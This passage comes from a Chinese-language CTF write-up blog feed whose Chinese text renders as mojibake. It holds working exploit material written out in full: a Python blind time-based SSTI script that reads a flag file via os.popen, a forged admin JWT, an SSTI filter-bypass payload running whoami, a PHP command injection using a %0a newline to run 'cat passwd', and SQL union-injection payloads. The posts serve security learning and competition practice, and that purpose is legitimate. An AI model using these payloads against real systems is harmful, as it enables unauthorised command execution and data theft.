&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">limiter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Limiter&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">key_func&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">get_remote_address&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">default_limits&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;10000 per hour&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@limiter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">limit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;5/second&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">override_defaults&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\x3c&lt;/span>&lt;span style="color:#d88200">pre&lt;/span>&lt;span style="color:#8045ff">\x3e\x3c&lt;/span>&lt;span style="color:#d88200">code&lt;/span>&lt;span style="color:#8045ff">\x3e&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#8045ff">\x3c&lt;/span>&lt;span style="color:#d88200">/code&lt;/span>&lt;span style="color:#8045ff">\x3e\x3c&lt;/span>&lt;span style="color:#d88200">/pre&lt;/span>&lt;span style="color:#8045ff">\x3e&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@limiter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">limit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;5/second&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">override_defaults&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/ssti&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/app/flag.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">strip&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;input&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;input&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Thank you for your input.&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;No input found.&amp;#34;&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å±žäºŽæ˜¯char-by-charç±»åž‹ç›²æ³¨å’Œsstiçš„ç»“åˆï¼Œé™åˆ¶äº†1ç§’5æ¬¡è¯·æ±‚ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬ç‰¹æ„é™åˆ¶ä¸€ä¸‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://9a5415f7-b712-423d-b7d4-7f2d61665f95.challenge.ctf.show/ssti?input=&amp;#39;&lt;/span>
&lt;span style="color:#111">_payload_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;{%25 set flag=config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;cat /app/flag.txt&amp;#39;).read()%25}{%25 set sleep=config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;sleep 2.5&amp;#39;)%25}{&lt;/span>&lt;span style="color:#d88200">%25i&lt;/span>&lt;span style="color:#d88200">f &amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#111">_payload_2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; in flag%25}{{sleep.read()}}{&lt;/span>&lt;span style="color:#d88200">%25e&lt;/span>&lt;span style="color:#d88200">ndif%25}&amp;#34;&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyz0123456789-_&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;ctfshow{&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">i&lt;/span>
&lt;span style="color:#75715e"># print(data)&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">_payload_1&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">_payload_2&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">timeout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2.5&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2.5&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ‰å°æ¦‚çŽ‡ä¼šå´©ï¼Œå¯ä»¥å¤šè·‘ä¸€æ¬¡&lt;/p>
&lt;h2 id="é€šå…³å¤§ä½¬">é€šå…³å¤§ä½¬&lt;/h2>
&lt;p>ç™»å½•ï¼Œå°è¯•admin: adminï¼Œå›žæ˜¾ ä½ ä¸èƒ½ä»¥ç®¡ç†å‘˜è´¦å·ç™»å½•ï¼ŒæŠ“åŒ…çœ‹åˆ°jwtï¼Œå…ˆç”¨jwt.ioæ¢­ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115110336856.png" alt="image-20211115110336856">&lt;/p>
&lt;p>å†ç”¨c-jwt-crackeræ¢­ä¸€ä¸‹ï¼Œçˆ†å‡ºæ¥key=12345ï¼ˆä¸è¿‡è¯´å®žè¯æˆ‘è¿™é‡ŒçœŸæ²¡çˆ†å‡ºæ¥ï¼‰ï¼Œå†ç”¨jwt.ioæ”¹ä¸€ä¸‹userå’Œexp&lt;/p>
&lt;pre tabindex="0">&lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJleHAiOjE2MzY5NTUwNjR9.jEw2QuCd67ZRC_eAVynhcZTYAyjHSxfrrpkqEF98Uio
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115120908659.png" alt="image-20211115120908659">&lt;/p>
&lt;p>çœ‹åˆ°è¿™ç§çš„æ¡†ï¼Œç›´è§‰å°±æ˜¯sqli, xss, sstiï¼›åŠ ä¸Šjwtä¸€èˆ¬flaskä¼šç”¨ï¼Œè¯•ä¸€ä¸‹sstiï¼Œæžœç„¶&lt;/p>
&lt;p>è¿™é‡Œçš„é€šå…³äººå¯¹é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼ŒæŽ’åéœ€è¦æ˜¯æ•°å­—ï¼Œæ—¶é—´æ²¡æœ‰å•¥å¿…è¦æ”¹ï¼Œæ„Ÿè¨€ä¸é™é•¿åº¦ï¼Œä½†æ˜¯è¿‡æ»¤äº†ä¸€ç¥¨å­—ç¬¦ï¼ˆå•åŒå¼•å·ï¼ˆæ— æ³•ç”¨hexå’Œæ‹¼æŽ¥ï¼‰ï¼Œä¸‹åˆ’çº¿ï¼Œrequestï¼Œä¸­æ‹¬å·ï¼Œç™¾åˆ†å·ï¼ˆæ— æ³•forè¯­å¥éåŽ† å¦‚æžœç”¨chr()è¿˜å¾—çˆ†ç ´ï¼‰ï¼Œç®—æ˜¯æ¯”è¾ƒä¸¥æ ¼çš„äº†ï¼‰ï¼Œå¯ä»¥ç”¨&lt;code>|attr()&lt;/code>è¿™æ ·çš„å½¢å¼æ¥ç»•è¿‡ï¼Œçœ‹äº†wpä¹‹åŽå‘çŽ°è¿™é‡Œè¿˜ç»“åˆäº†&lt;code>request.args&lt;/code>ï¼Œä¹Ÿå°±æ˜¯åŠ ä¸€äº›getå‚æ•°ç„¶åŽåœ¨postçš„éƒ¨åˆ†è¿›è¡Œå¼•ç”¨ï¼Œå†å……åˆ†åˆ©ç”¨configè¿™ä¸ªå¯¹è±¡ï¼ˆå‰é¢é‚£ä¸ªåŽŸé¢˜ä¹Ÿæ˜¯å……åˆ†ç”¨äº†configï¼‰ï¼Œpayload:&lt;/p>
&lt;pre tabindex="0">&lt;code>/edit?a=__init__&amp;amp;b=__globals__&amp;amp;c=__getitem__&amp;amp;d=os&amp;amp;e=popen&amp;amp;f=whoami&amp;amp;g=read
POST: name={%25set%20r=request.args%25}&amp;amp;rank=1&amp;amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;amp;time=2021å¹´11æœˆ11æ—¥
&lt;/code>&lt;/pre></description></item><item><title>Bilibili 1024å®‰å…¨æ”»é˜² Wp</title><link>https://amiaaaz.github.io/2021/11/14/bilibili-sec1024-wp/</link><pubDate>Sun, 14 Nov 2021 20:15:47 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/14/bilibili-sec1024-wp/</guid><description>&lt;h2 id="å®‰å…¨æ”»é˜²--1">å®‰å…¨æ”»é˜²&amp;ndash;1&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/r1.html">https://security.bilibili.com/sec1024/q/r1.html&lt;/a> | &lt;a href="https://baike.baidu.com/item/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86/468774">æç¤º&lt;/a>&lt;/p>
&lt;p>1024ç¨‹åºå‘˜èŠ‚ï¼Œå¤§å®¶ä¸€èµ·å’Œ2233å‚ä¸Žè§£å¯†æ¸¸æˆå§~
happy_1024_2233:
e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364
0408abca7deabb96a58f50471171b60e02b1a8dbd32db156&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114154001444.png" alt="image-20211114154001444">&lt;/p>
&lt;p>&lt;code>a1cd5f84-27966146-3776f301-64031bb9&lt;/code>&lt;/p>
&lt;h2 id="å®‰å…¨æ”»é˜²--2">å®‰å…¨æ”»é˜²&amp;ndash;2&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/">https://security.bilibili.com/sec1024/q/&lt;/a> | &lt;a href="https://cli.vuejs.org/zh/config/#productionsourcemap">æç¤º&lt;/a>&lt;/p>
&lt;p>æŸé«˜çº§å‰ç«¯å¼€å‘æ”»åŸŽç‹®æ›´æ”¹äº†ä¸€ä¸ªå‰ç«¯é…ç½®é¡¹&lt;/p>
&lt;/blockquote>
&lt;p>æç¤ºä¸­ç»™çš„æ˜¯vueçš„å®˜æ–¹æ–‡æ¡£ï¼Œå¹¶ä¸”å®šä½åˆ°äº†productionSourceMap&lt;/p>
&lt;p>æ¥ä¸€æ³¢f12&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114154330638.png" alt="image-20211114154330638">&lt;/p>
&lt;p>&lt;code>36c7a7b4-cda04af0-8db0368d-b5166480&lt;/code>&lt;/p>
&lt;h2 id="å®‰å…¨æ”»é˜²--3">å®‰å…¨æ”»é˜²&amp;ndash;3&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/eval.zip">https://security.bilibili.com/sec1024/q/eval.zip&lt;/a> | &lt;a href="https://www.php.net/manual/zh/function.preg-match.php">æç¤º&lt;/a>&lt;/p>
&lt;p>PHP is the best language for web programming, but what about other languages?&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> bilibili- ( ã‚œ- ã‚œ)ã¤ãƒ­ ä¹¾æ¯~
&lt;/span>&lt;span style="color:#75715e"> uat: http://192.168.3.2/uat/eval.php
&lt;/span>&lt;span style="color:#75715e"> pro: http://security.bilibili.com/sec1024/q/pro/eval.php
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#111">$args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;args&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^\w+$/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">// todo: other filter
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;/bin/2233 &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">implode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;br&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥getæ–¹å¼æŽ¥æ”¶æœ€å¤š3ä¸ªåä¸ºargsçš„å‚æ•°ï¼Œå¯¹æ¯ä¸ªå‚æ•°çš„å€¼è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œæœ€åŽæ‹¼æŽ¥åˆ°$cmdåŽé¢è¢«execæ‰§è¡Œï¼Œç”¨%0aæ¢è¡Œ+æ•°ç»„[]ç»•è¿‡&lt;/p>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;amp;args[]=ls
https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;amp;args[]=cat&amp;amp;args[]=passwd
&lt;/code>&lt;/pre>&lt;p>&lt;code>9d3c3014-6c6267e7-086aaee5-1f18452a&lt;/code>&lt;/p>
&lt;h2 id="å®‰å…¨æ”»é˜²--4">å®‰å…¨æ”»é˜²&amp;ndash;4&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/">https://security.bilibili.com/sec1024/q/&lt;/a> | &lt;a href="https://baike.baidu.com/item/sql%E6%B3%A8%E5%85%A5/150289">æç¤º&lt;/a>&lt;/p>
&lt;p>æ‡‚çš„éƒ½æ‡‚&lt;/p>
&lt;/blockquote>
&lt;p>æœ‰ä¸ªè¯·æ±‚api &lt;a href="https://security.bilibili.com/sec1024/q/admin/api/v1/log/list">https://security.bilibili.com/sec1024/q/admin/api/v1/log/list&lt;/a>ï¼Œæœ¬èƒ½çš„åŽ»fuzzä¸€ä¸‹ï¼Œç»“æžœ412äº†â€¦â€¦QAQ&lt;/p>
&lt;p>usernameéƒ¨åˆ†å¯ä»¥sqliï¼Œè¿‡æ»¤äº†ç©ºæ ¼å’Œå•å¼•å·ï¼Œç”¨æ³¨é‡Šå’Œ16è¿›åˆ¶ç»•è¿‡&lt;/p>
&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,5&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(id)/**/from/**/flag#&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>3d5dd579-0678ef93-18b70cae-cabc5d51&lt;/code>&lt;/p>
&lt;hr>
&lt;p>éš¾åº¦åº”è¯¥ç®—æ˜¯åç®€å•çš„ï¼Œå°±æ˜¯ï¼Œemmmmmmmmmm&lt;/p>
&lt;p>ç®—äº†ï¼Œæˆ‘ä¸å¥½è¯´&lt;/p></description></item><item><title>buuojåŠ å›ºé¢˜ Wp</title><link>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</link><pubDate>Sun, 07 Nov 2021 08:57:29 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</guid><description>&lt;p>buuojæ–°ä¸Šäº†åŠ å›ºé¢˜è¿™ä¸ªåˆ†ç±»ï¼Œä¹Ÿå°±æ˜¯çº¿ä¸‹awdpä¸­fixçš„éƒ¨åˆ†ï¼Œåªè¦å°†é¶æœºä¸­å­˜åœ¨çš„æ¼æ´žä¿®å¤å¥½å¹¶é€šè¿‡checkçš„æ£€æµ‹å³å¯æ‹¿åˆ°flagï¼›æœ‰ä¸€è¯´ä¸€ï¼Œæ¯”å•çº¯attackæ‹¿flagä¼šç®€å•å¾ˆå¤šï¼ˆé€‚åˆæˆ‘è¿™ç§æ²¸ç‰©web&lt;/p>
&lt;p>ä¸‹é¢çš„wpä¼šå…ˆè¯´çº¯ä¿®å¤è§’åº¦ï¼Œå†ä¸²ä¸€ä¸‹æ•´ä½“çš„çŸ¥è¯†ç‚¹ï¼›å› ä¸ºè‡ªå·±æ°´å¹³æœ‰é™ï¼Œæƒ³å°½å¯èƒ½è¯´çš„æ¸…æ¥šä¸€äº›å°±ä¼šæ¯”è¾ƒå•°å—¦ï¼Œè§è°…QAQ&lt;/p>
&lt;h2 id="ezsql">Ezsql&lt;/h2>
&lt;h3 id="fix">FIX&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083450780.png" alt="image-20211107083450780">&lt;/p>
&lt;p>200è¡Œï¼Œå¤ªå…¸äº†ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°å®Œå…¨æ²¡æœ‰æ£€æµ‹ï¼Œæ˜¯ä¸ªç­›å­ï¼›ç”¨é¢„å¤„ç†çš„æ–¹å¼ä¿®ï¼Œåˆå¯ä»¥åˆ†ä¸ºä¸¤ç§å½¢å¼&lt;/p>
&lt;h3 id="mysqlé¢„å¤„ç†">mysqlé¢„å¤„ç†&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083655664.png" alt="image-20211107083655664">&lt;/p>
&lt;p>å…¶ä¸­201è¡Œçš„&lt;code>ss&lt;/code>æŒ‡çš„æ˜¯ç»‘å®šSQLå‚æ•°çš„ç±»åž‹ä¸ºstringï¼Œè¿™ä¸€é¡¹å¿…ä¸å¯å°‘è€Œä¸”å¿…é¡»ä¸ŽåŽé¢çš„å‚æ•°ä¸€ä¸€å¯¹åº”&lt;/p>
